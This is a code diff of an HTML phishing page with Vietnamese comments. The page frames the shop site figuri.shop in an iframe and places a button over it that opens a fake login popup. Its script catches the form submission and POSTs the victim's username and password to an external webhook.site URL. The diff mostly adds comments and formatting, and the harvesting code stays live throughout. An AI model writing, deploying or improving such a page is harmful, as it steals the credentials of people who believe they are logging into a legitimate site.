@@ -58,10 +58,12 @@
     }
 
     .overlay-background {
-      display: none;
+      display: none; /* Ẩn mặc định */
       position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
       background: rgba(0, 0, 0, 0.4);
       z-index: 99;
     }
@@ -71,11 +73,13 @@
 
   <div class="container">
     <iframe src="https://figuri.shop"></iframe>
-    <button class="overlay-button" onclick="showLogin()"></button>
+    <button class="overlay-button" onclick="showLogin()">Hiển thị form đăng nhập</button>
   </div>
 
+  <!-- Overlay nền -->
   <div class="overlay-background" id="overlayBg" onclick="hideLogin()"></div>
 
+  <!-- Form đăng nhập -->
   <div class="login-popup" id="loginPopup">
     <h3>Đăng nhập</h3>
     <form id="loginForm">
@@ -85,45 +89,47 @@
     </form>
   </div>
 
- <script>
-  function showLogin() {
-    document.getElementById('loginPopup').style.display = 'block';
-    document.getElementById('overlayBg').style.display = 'block';
-  }
+  <script>
+    // Hàm để hiển thị form đăng nhập và overlay nền
+    function showLogin() {
+      document.getElementById('loginPopup').style.display = 'block';  // Hiển thị form
+      document.getElementById('overlayBg').style.display = 'block';  // Hiển thị nền
+    }
 
-  function hideLogin() {
-    document.getElementById('loginPopup').style.display = 'none';
-    document.getElementById('overlayBg').style.display = 'none';
-  }
+    // Hàm để ẩn form đăng nhập và overlay nền
+    function hideLogin() {
+      document.getElementById('loginPopup').style.display = 'none';  // Ẩn form
+      document.getElementById('overlayBg').style.display = 'none';  // Ẩn nền
+    }
 
-  document.getElementById('loginForm').addEventListener('submit', function(e) {
-    e.preventDefault();
+    // Xử lý form submit và gửi dữ liệu đến webhook
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault(); // Ngừng hành động mặc định
 
-    const form = document.createElement('form');
-    form.method = 'POST';
-    form.action = 'https://webhook.site/4c4b6cd8-f709-4df9-b9a1-b1380858fd00';
+      const form = document.createElement('form');
+      form.method = 'POST';
+      form.action = 'https://webhook.site/4c4b6cd8-f709-4df9-b9a1-b1380858fd00';
 
-    const input1 = document.createElement('input');
-    input1.type = 'hidden';
-    input1.name = 'username';
-    input1.value = document.getElementById('username').value;
+      const input1 = document.createElement('input');
+      input1.type = 'hidden';
+      input1.name = 'username';
+      input1.value = document.getElementById('username').value;
 
-    const input2 = document.createElement('input');
-    input2.type = 'hidden';
-    input2.name = 'password';
-    input2.value = document.getElementById('password').value;
+      const input2 = document.createElement('input');
+      input2.type = 'hidden';
+      input2.name = 'password';
+      input2.value = document.getElementById('password').value;
 
-    form.appendChild(input1);
-    form.appendChild(input2);
+      form.appendChild(input1);
+      form.appendChild(input2);
 
-    document.body.appendChild(form);
-    form.submit();
+      document.body.appendChild(form);
+      form.submit();
 
-    // Ẩn form sau khi submit
-    hideLogin();
-  });
-</script>
-
+      // Ẩn form sau khi submit
+      hideLogin();
+    });
+  </script>
 
 </body>
 </html>
